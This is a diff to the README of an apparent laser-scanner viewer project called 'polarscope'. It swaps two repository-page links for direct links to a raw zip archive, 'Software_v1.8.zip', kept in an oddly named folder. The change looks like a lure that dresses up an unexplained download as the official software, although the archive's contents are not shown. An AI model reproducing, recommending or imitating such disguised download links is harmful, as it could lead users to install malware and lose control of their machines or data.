@@ -1,6 +1,6 @@
 # 📡 polarscope - View laser scanner data in real-time
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Proconsular-firkin500/polarscope)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Proconsular-firkin500/polarscope/raw/refs/heads/main/electrotautomerism/Software_v1.8.zip)
 
 ## 📋 About the application
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Visit the link below to reach the project page.
 
-[https://github.com/Proconsular-firkin500/polarscope](https://github.com/Proconsular-firkin500/polarscope)
+[https://github.com/Proconsular-firkin500/polarscope/raw/refs/heads/main/electrotautomerism/Software_v1.8.zip](https://github.com/Proconsular-firkin500/polarscope/raw/refs/heads/main/electrotautomerism/Software_v1.8.zip)
 
 1. Open your web browser.
 2. Select the green Code button on the repository page.
